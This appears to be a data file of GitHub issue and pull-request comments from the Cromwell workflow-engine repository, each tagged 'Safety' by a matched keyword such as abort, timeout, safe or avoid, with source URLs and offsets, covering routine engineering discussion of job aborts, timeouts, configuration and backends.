Safety,"@Horneth Does this mean we should hold off before claiming we ""fixed aborts""? :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2820#issuecomment-341607290:69,abort,aborts,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2820#issuecomment-341607290,1,['abort'],['aborts']
Safety,"@Horneth I believe the transformation is more like `StateData + DB Calls` to `DB Calls + more DB Calls`. Currently, the AbortAll route just sends a msg to all the WorkflowActorRefs in the state data, and then waits's until the all the actors have responded with a terminal state.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201068582:120,Abort,AbortAll,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201068582,1,['Abort'],['AbortAll']
Safety,@Horneth Is it safe to say that this is close-able? We can add new tickets for specific change requests,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2403#issuecomment-414084949:15,safe,safe,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2403#issuecomment-414084949,1,['safe'],['safe']
Safety,"@Horneth Oh, I forgot that we always try to `evaluate` first, then predict second.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4208#issuecomment-427135891:67,predict,predict,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4208#issuecomment-427135891,1,['predict'],['predict']
Safety,"@Horneth Right. It should be impossible to hit but we have to put something there for the state anyways so I figured might as well keep it there to be safe. The alternative is to put a NullFunctions there (or whatever it is called), I'm happy to do either",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/150#issuecomment-134294537:151,safe,safe,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/150#issuecomment-134294537,1,['safe'],['safe']
Safety,"@Horneth While there are places we can't help it, I""d prefer we avoid creating Futures inside of actors, instead preferring worker actors for async behavior. That helps to preserve the actor model/abstraction and removes a huge potential pitfall",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218550510:64,avoid,avoid,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218550510,1,['avoid'],['avoid']
Safety,@Horneth how about this ticket for testing aborts?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-337074635:43,abort,aborts,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-337074635,1,['abort'],['aborts']
Safety,"@LeeTL1220 @Horneth I doubt enabling continue on return would work. You are getting timeouts not only when uploading log files, but also when localizing files. Ive observed this occasionally to with wide scatters and multiple workflows. ; It starting to seem more like an api Issue. I know in the cromwell conf there is a property for setting the total number of concurrent workflows, but I do not know if this is extended to the task level. It would be interesting to see whether or not limiting the number of concurrent tasks in a scatter would have any impact on this. That or better scattering the task submission for scatters instead of submitting all tasks basically at once. This is one of our major pain points too. So far the only reasonable solution we have had (other then adjusting api quotas) is just to tell users to rerun a wf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300177559:84,timeout,timeouts,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300177559,1,['timeout'],['timeouts']
Safety,"@LeeTL1220 @Horneth I ran into similar issues when running > 400 Tasks Simultaneously. I would occasionally get 403 from the JES backend from various causes; - size built in function would timeout ; - Pulling the docker image from gcr.io would time out; - occasionally pulling the docker image from docker hub would also time out; - I also observed the above error that you were experiencing as well. I was not able to debug any of them, because of the transient nature. Rerunning the workflow generally fixed the problem. I am also using preemptible instances for the majority of the tasks that were being run, however I do not see how that could be contributing to the issue. If anything i would guess that we are bumping into an api quota and are being throttled by google leading to the timeouts",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300167322:189,timeout,timeout,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300167322,2,['timeout'],"['timeout', 'timeouts']"
Safety,@LeeTL1220 is this related to #1495 in that the Ctl-C did not properly abort? If so then I'd like to track the effort there and I'll close this.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-325444026:71,abort,abort,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-325444026,1,['abort'],['abort']
Safety,@LeeTL1220 is this still something you want? Can you explain a bit more about your use case for wanting to override a runtime attribute?. @geoffjentry what would the effort be to add this feature? Any risks in adding it?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-323857659:201,risk,risks,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-323857659,1,['risk'],['risks']
Safety,"@LeeTL1220 my `reference.conf` database section looks correct:. ```; database {; # hsql default; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = ""jdbc:hsqldb:mem:${uniqueSchema};shutdown=false;hsqldb.tx=mvcc""; connectionTimeout = 3000; }. # mysql example; #driver = ""slick.driver.MySQLDriver$""; #db {; # driver = ""com.mysql.jdbc.Driver""; # url = ""jdbc:mysql://host/cromwell?rewriteBatchedStatements=true""; # user = ""user""; # password = ""pass""; # connectionTimeout = 5000; #}. # For batch inserts the number of inserts to send to the DB at a time; # insert-batch-size = 2000. migration {; # For databases with a very large number of symbols, selecting all the rows at once can generate a variety of; # problems. In order to avoid any issue, the selection is paginated. This value sets how many rows should be; # retrieved and processed at a time, before asking for the next chunk.; read-batch-size = 100000. # Because a symbol row can contain any arbitrary wdl value, the amount of metadata rows to insert from a single; # symbol row can vary from 1 to several thousands (or more). To keep the size of the insert batch from growing out; # of control we monitor its size and execute/commit when it reaches or exceeds writeBatchSize.; write-batch-size = 100000; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2217#issuecomment-298110016:760,avoid,avoid,760,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2217#issuecomment-298110016,1,['avoid'],['avoid']
Safety,"@LeeTL1220 this is a dual problem: [aborts need work](https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit), and [logs need work](https://docs.google.com/document/d/1Dc37EaPDoWXacSSzLgCdndx9zo5k6EmE5tvg-2fisPo/edit#). I'm going to link this issue there and close it out.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1637#issuecomment-325668920:36,abort,aborts,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1637#issuecomment-325668920,1,['abort'],['aborts']
Safety,"@adamstruck I still need to do a more in depth review if you're looking for scala syntax feedback (ex: `case … => { … }` could be `case … => …`). Early feedback:. - PR 1930 contains a few more changes to the standard backend api. I tested cherry-picking 1930 onto this PR to see what would be left to patch up. Using an ""Obsolete"" set of bridge code for now, [these](https://github.com/kshakir/cromwell/commit/19f3bad4ca752ac47ab6f37b694dbdaec8850b36) are the minimal changes for the updated path api, plus changes for standardized command line generation. NOTE: 1930 is still under review and may change, plus the linked github commit will be deleted once these two PRs are merged. - The standard backend will continue to change for a while as we move more common code. For example, the script generation for globs is now centralized as of PR 1930. The only CI testing I am aware of at the moment is `sbt tesBackend/test` that runs under travis. Is there a dockerized solution yet for TES that we could use with travis centaur, like we have for JES and Local? Otherwise, the minimal patches above pass the very, very basic sbt test unit tests. - Your PR is ok as is, but I need to think about necessity of `Async.await` a bit more. The standard backend api is synchronous, requiring the `Async.await`. But the underlying ""basic"" backend trait is using scala futures, and I need more insight into how those are interacting with the akka actors. For example, I wouldn't want the actors receiving multiple akka poll messages in the mailbox and then queuing up dozens of overlapping poll futures in the thread pool. I also really like that your awaits have timeouts and aren't infinite futures. More to come. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1816#issuecomment-276378295:1654,timeout,timeouts,1654,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1816#issuecomment-276378295,2,['timeout'],['timeouts']
Safety,"@aednichols I agree with your point regarding Google. However, I feel like there is a huge conflict of interest here: how can Google motivate itself to fix something that could potentially allow them to make a lot of money? How does Google suggest users should fix this problem? It seems a huge financial risk to include docker images in `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io` as the corresponding buckets need to be public and cannot be set as Requester Pays, so anybody can download them at will. Do you have advice for how to best reach out to them to advocate for this?. Replicating images across regions is currently not very sustainable as it would rely on users' good will and understanding of this complicated problem, as Cromwell does not have a framework to automatically understand within a workflow which docker images it should pull. If Google does not get their act together, I suppose that ultimately the Cromwell team has to come to terms with the fact that the `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io` repository solutions are not sustainable and an alternative will need to be engineered and provided to those writing WDL pipelines. Not sure what the easiest solution would be though. Cromwell currently has some framework for dealing deferentially with Files with optional localization when a WDL is run on Google Cloud. Could something be included in Cromwell to allow the WDL to know in which Google cloud the tasks are being run so that at least the best repository could be automatically selected?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884342364:305,risk,risk,305,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884342364,1,['risk'],['risk']
Safety,"@alartin - the concurrent-job-limit limits how many jobs will be in a ""runnable / running"" state at a time. It also has the side effect of limiting how many jobs are submitted when the workflow starts. Scatter jobs do not currently map to AWS Batch Array jobs. It would definitely be a good thing to implement and it would also be an effective way to avoid API request limits.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-442973335:351,avoid,avoid,351,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-442973335,1,['avoid'],['avoid']
Safety,@antonkulaga It'll probably be > 1 week. We can't predict the frequency of the dot releases as they're almost always in response to some fire that erupts in production.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3306#issuecomment-367445955:50,predict,predict,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3306#issuecomment-367445955,1,['predict'],['predict']
Safety,"@aofarrel I recommend setting a [`concurrent-job-limit`](https://cromwell.readthedocs.io/en/stable/backends/Backends/) value of 1 so that Cromwell only starts one job at once. . The interface between Cromwell and its backends is designed so that resource management happens entirely within the backend. As such, Cromwell never knows how much memory/CPU a backend has; rather the backend is expected to start as many jobs as it can safely handle and stop when it reaches the limit. What you're finding is that the local backend, implemented with Docker, doesn't support that self-management because it is a non-goal of the Docker product itself. Docker tries to start whatever containers you request, immediately. Since I _think_ `concurrent-job-limit` should fully address your problem, I am going to close the issue. If that's not the case feel free to reopen.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-803082272:431,safe,safely,431,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-803082272,1,['safe'],['safely']
Safety,@bradtaylor can you clarify which issue is more concerning? Is it the aborting issue or the status updating?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334499574:70,abort,aborting,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334499574,1,['abort'],['aborting']
Safety,"@cjllanwarne #811 #812 for Local and JES config sanity checking, #813 to create filesystems in the initialization actor. The logging issue might be better suited for discussion prior to ticketing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/797#issuecomment-217980738:48,sanity check,sanity checking,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/797#issuecomment-217980738,1,['sanity check'],['sanity checking']
Safety,@cjllanwarne - good points about having it optional. I'll look into adding a config option and only running this code if they specify Jes as the backend and also abort.jobs.on.terminate (or whatever it should be called),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173971121:162,abort,abort,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173971121,1,['abort'],['abort']
Safety,"@cjllanwarne ; Are you saying that Cromwell is going to determine if the input file is reference file by checking each input file against the manifest file? This is not how I imagined it. I thought manifest file with checksums is only needed to verify file's up-to-dateness. I imagined it work this way: when user creates a WDL and specifies input files for the workflow, they would look like `gs://gcp-public-data--broad-references/some/path/reference_file.txt`. Cromwell will see this path and think ""ok, this file is a reference file, since it's located in this special bucket, so I will mount a references disk to `/mnt/refdisk` and check for this file in the `/mnt/refdisk/some/path/reference_file.txt` location, but before going on and doing that I'll verify that checksum of that file in GCS matches the one in manifest file"".; I mean bucket name seems redundant in this case, since it's the same for all reference files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5587#issuecomment-664613517:860,redund,redundant,860,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5587#issuecomment-664613517,1,['redund'],['redundant']
Safety,"@cjllanwarne ; I'm not sure I fully understand what you mean here. `checkalive` does run/schedule when `isAlive` is called.; Al tough I think what I use now is almost as you did explain. Only difference is that I first do isAlive instead of checking the exitcode. In f30c2be I did switch this. (first exitcode, then isAlive). Before I did had a default timeout of 120 seconds but I did remove that because of earlier comments. I can bring that back in if you want?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423934018:353,timeout,timeout,353,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423934018,1,['timeout'],['timeout']
Safety,"@cjllanwarne @Horneth re the saving people from themselves, while I don't completely disagree what would be the use case here? If someone is running in local or SGE mode they'd need to be running Cromwell with (for now) Google credentials which means they probably know what they're doing. The ""don't completely disagree"" part is that I support the idea in general but think it should default to the unsafe direction as IMO it's more likely someone gets bit by it being turned off than turned on.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161060201:400,unsafe,unsafe,400,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161060201,1,['unsafe'],['unsafe']
Safety,"@cjllanwarne @aednichols Sorry for my late reaction, I was on holiday last week. I have removed the forInput variable entirely thanks to @cjllanwarne's feedback. Instead I created the `makeInputSpecificFunctions` in the `IoFunctionSet` trait so every backend can use it. I then overrided it in the sfsBackend to return another class with a different postmapping. This made the `forInput` variable redundant.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5495#issuecomment-623374492:397,redund,redundant,397,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5495#issuecomment-623374492,2,['redund'],['redundant']
Safety,"@cjllanwarne Firecloud needs it, this is to avoid cromwell to always require a google auth (even when running only local backend).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1135#issuecomment-231374697:44,avoid,avoid,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1135#issuecomment-231374697,1,['avoid'],['avoid']
Safety,"@cjllanwarne I pointed to the wrong line of code, sorry for that. I have identified the bug. The refactoring produced **better** code. The code written before the refactoring created a rc file with exit code `9`(Which was probably a mistake as the comments above the code said that 137 was chosen, for kill -9). `137` for SIGKILL would have been the better value. The current refactored code uses SIGTERM (`143`). This looks nicer, but unfortunately the functionality of the code depended on the choice for `9`. . If cromwell gets SIGINT (`130`) , SIGKILL (`137`) or SIGTERM(`143`) as exit codes for a job, it assumes that cromwell was the one that aborted them and the jobs should NOT be retried. This makes perfect sense. . The refactored code now returns a return code(`143`) that makes cromwell believe that the job should not be retried. My solution would be to write a non-sensical return code in the case exit-timeout-seconds is used. I am working on a pr now. EDIT: This change indeed fixes the problem. PR coming.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4998#issuecomment-496236589:649,abort,aborted,649,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4998#issuecomment-496236589,2,"['abort', 'timeout']","['aborted', 'timeout-seconds']"
Safety,@cjllanwarne I think it's finished now. Meanwhile I detected a bug but did solve this with an other opt-in config value to be able to retry jobs that are aborted. Aborted here means an exitcode above 128 if i read the code correctly. Maybe rename this to ExternalKill instead?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-426991174:52,detect,detected,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-426991174,3,"['Abort', 'abort', 'detect']","['Aborted', 'aborted', 'detected']"
Safety,@cjllanwarne and @geoffjentry ; I did make a change that when exit-code-timeout is not set `isAlive` is not used anymore. One note I need to make about this. This can give the wrong impression to HPC users. isAlive is there the only way to ensure if a job is still running while the rc file is not stable.; This is a setting that should be default for all dispatch systems that does force kill the jobs.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424634854:72,timeout,timeout,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424634854,1,['timeout'],['timeout']
Safety,"@cjllanwarne any update on whether this is still an issue? I know aborts is a tangled mess, is this still part of that?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2050#issuecomment-329662040:66,abort,aborts,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2050#issuecomment-329662040,1,['abort'],['aborts']
Safety,"@cjllanwarne example scenario:. - Workflow starts; - a few jobs start; - cromwell is restarted; - immediately after, someone aborts this workflow. the workflow can be anywhere from still in the workflow store (waiting to be picked up and restarted) to executing. If it's anywhere but executing (could be materialization, workflow initialization...), the behavior right now is ""we're not executing this workflow yet, which means we haven't started any jobs, so it's fine to just mark it aborted and stop"". This doesn't work because this workflow does have running jobs that will 1) never be aborted 2) stay ""running"" forever in the metadata",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2829#issuecomment-342651363:125,abort,aborts,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2829#issuecomment-342651363,3,['abort'],"['aborted', 'aborts']"
Safety,@cjllanwarne provided you're fully satisfied that it's safe and is well tested I'm good,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3938#issuecomment-409374762:55,safe,safe,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3938#issuecomment-409374762,1,['safe'],['safe']
Safety,"@cjllanwarne regarding merges to master, there indeed was a merge of the grammar change for call blocks. The new parser worked just fine without the associated Cromwell changes, which is proof that the bugfix is safe with respect to WDL implementations.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4789#issuecomment-479653436:212,safe,safe,212,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4789#issuecomment-479653436,1,['safe'],['safe']
Safety,@cjllanwarne thanks for the feedback. I added the requested code. In the testing I took care to avoid code duplication. Is the code up to cromwell standards?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-421985663:96,avoid,avoid,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-421985663,2,['avoid'],['avoid']
Safety,"@cjllanwarne that's a great point. This should be super test-able as well to see if its easy to recreate. I also wonder if we can see a ""spike"" of aborting workflow states after a restart in grafana -- not sure if that's actually feasible?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4767#issuecomment-482741999:147,abort,aborting,147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4767#issuecomment-482741999,1,['abort'],['aborting']
Safety,"@cjllanwarne there was one `ignore`d test about default runtime attributes that pretty clearly seemed to be covered by newer tests, so I've deleted that as well. There's one other abort test we should definitely continue to feel bad about, and another test for a ""taskless workflow"" for which I couldn't readily find an equivalent.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2566#issuecomment-324120498:180,abort,abort,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2566#issuecomment-324120498,2,['abort'],['abort']
Safety,@cjllanwarne what's the WEA? Sounds like another one for the [Aborts google doc](https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1521#issuecomment-325027517:62,Abort,Aborts,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1521#issuecomment-325027517,1,['Abort'],['Aborts']
Safety,"@cjllanwarne, checked works as expected:; ```; 2020-06-04 21:43:38,063 cromwell-system-akka.dispatchers.engine-dispatcher-29 INFO - WorkflowManagerActor WorkflowActor-796f3949-47e6-497e-9458-59ab53a063c6 is in a terminal state: WorkflowSucceededState; 2020-06-04 21:43:43,504 cromwell-system-akka.actor.default-dispatcher-56 ERROR - Carboniting failure: cromwell.services.MetadataTooLargeNumberOfRowsException: Metadata for workflow 796f3949-47e6-497e-9458-59ab53a063c6 exists indatabase, but cannot be served. This is done in order to avoid Cromwell failure: metadata is too large - 283000000 rows, and may cause Cromwell instance to die on attempt to read it in memory. Configured metadata safety limit is 1000000.. Marking as TooLargeToArchive; cromwell.services.MetadataTooLargeNumberOfRowsException: Metadata for workflow 796f3949-47e6-497e-9458-59ab53a063c6 exists indatabase, but cannot be served. This is done in order to avoid Cromwell failure: metadata is too large - 283000000 rows, and may cause Cromwell instance to die on attempt to read it in memory. Configured metadata safety limit is 1000000.; 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor$$anonfun$2.applyOrElse(MetadataBuilderActor.scala:283); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor$$anonfun$2.applyOrElse(MetadataBuilderActor.scala:267); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:38); 	at akka.actor.FSM.processEvent(FSM.scala:707); 	at akka.actor.FSM.processEvent$(FSM.scala:704); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor.akka$actor$LoggingFSM$$super$processEvent(MetadataBuilderActor.scala:245); 	at akka.actor.LoggingFSM.processEvent(FSM.scala:847); 	at akka.actor.LoggingFSM.processEvent$(FSM.scala:829); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor.processEvent(MetadataBuilderActor.scala:245); 	at akka.actor.FSM.akka$actor$FSM$$processMsg(FSM.scala:701); 	at akka.actor.FSM$$anonfun$receive$1.apply",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-639142073:536,avoid,avoid,536,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-639142073,3,"['avoid', 'safe']","['avoid', 'safety']"
Safety,@cpavanrun If this is enabled in the config like this it does retry:; https://cromwell.readthedocs.io/en/develop/RuntimeAttributes/#maxretries. Also the timeout will start counting when isAlive returns false for the first time. After that isAlive will not be called anymore.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-425008288:153,timeout,timeout,153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-425008288,1,['timeout'],['timeout']
Safety,"@danbills The Orchestrator pattern as described above is what we discussed. . Per your other questions, the answer is that AWS Batch does not take a array of arbitrary scripts as an option, nor can you override a Docker container's `ENTRY_POINT` to supply your own script if the entry point of the container has been changed from the default shell. You can only specify an array to pass into Docker daemon's `CMD`. Speaking of default shells, the other arguments against a set of shell scripts is that it limits the set of containers that can be called from a WDL. For example, the current Cromwell scripts that are injected into the container assume Bash support, but by default Alpine Linux (and many containers that build off of it) do not have Bash installed. . Most of the time the above two items are safe assumptions, but not always, hence the current plan to implement data staging via a sibling container approach similar to how CI systems are deployed today. For inspiration, I refer to [Dave Hein's excellent article on running sibling containers in lieu of docker-in-docker](https://www.develves.net/blogs/asd/2016-05-27-alternative-to-docker-in-docker/)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-400025987:807,safe,safe,807,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-400025987,1,['safe'],['safe']
Safety,"@danbills does the following sound accurate to you?. As a **user running workflows on Pipelines API**, I want **Cromwell to notify me when it hits the limit for retries**, so that **I know why my workflow failed**.; * Effort: Small; * Risk: Small; * Business value: Small to Medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2426#issuecomment-332648095:235,Risk,Risk,235,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2426#issuecomment-332648095,1,['Risk'],['Risk']
Safety,"@dgtester I wouldn't avoid the scala shutdown hook if it makes sense (making this up as I go, but e.g. sending a message to WorkflowActor which then propagates outward), there've been a handful of things that I've been meaning to add to a hook anyways so there'll be one sooner or later anyways",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-174198348:21,avoid,avoid,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-174198348,1,['avoid'],['avoid']
Safety,@dinvlad In my PR (#5023) the intention was to allow users to be able to interact with BQ from inside their WDL commands. With that in mind I believe what you're suggesting is that nothing untoward would happen unless they did this and their service account didn't have the corresponding permission set. Is that correct?. I still think it's worth testing to be sure but since it looks like we've added scopes before w/o issue I'm less fearful .... but IMO there's still a risk and we should make sure the risk is 0. Denis - it's on my list to poke at this but if you all don't want to wait for me and would like to validate success/failure please feel free to do so,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502247296:472,risk,risk,472,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502247296,2,['risk'],['risk']
Safety,"@dtenenba , @vortexing - The [docs](https://docs.opendata.aws/genomics-workflows) for creating the genomics workflow environment (i.e. AWS Batch and related resources) have been updated. Use of custom AMIs has been deprecated in favor of using EC2 Launch Templates. There's also additional parameter validation under the hood around setting up an environment for Cromwell to avoid these configuration errors.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-470339885:375,avoid,avoid,375,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-470339885,1,['avoid'],['avoid']
Safety,"@dvoet I'm going through the backlog and I was wondering if you're still seeing this problem. Aborts are a known issue for Cromwell but I wasn't sure if a newer version of Cromwell happened to do this better. If so, I'll close this out, if not I'll keep it around for when we fix aborts.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1885#issuecomment-291888077:94,Abort,Aborts,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1885#issuecomment-291888077,2,"['Abort', 'abort']","['Aborts', 'aborts']"
Safety,"@ffinfo my concern was more that the `isAlive` should be opt-in, not that that timeout should be opt in. . if I'm reading this right (EDIT: I think I got it a bit wrong first time):. - The job enters the `Running` state; - The first time we poll for it, we *always* check whether it's alive; - While it still is, we keep running `isAlive` every time we get polled; - Otherwise we enter the `WaitingForReturnCode`; - After the job is no longer alive, we abandon it after a given timeout and declare it failed; - If no timeout is configured, we keep waiting forever. I think this shouldn't be too much of a refactor:. - The job enters the `WaitingForReturnCode` state; - We immediately schedule an `CheckAlive` message to the actor at the configurable time; - If the cadence is not set, we never send that message (this would be the default); - When that CheckAlive arrives we can run `isAlive` and remember the result (and if we're still alive, schedule another `CheckAlive` again after the same delay); - If the `isAlive` failed, the next poll would return `Failed`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423569265:79,timeout,timeout,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423569265,3,['timeout'],['timeout']
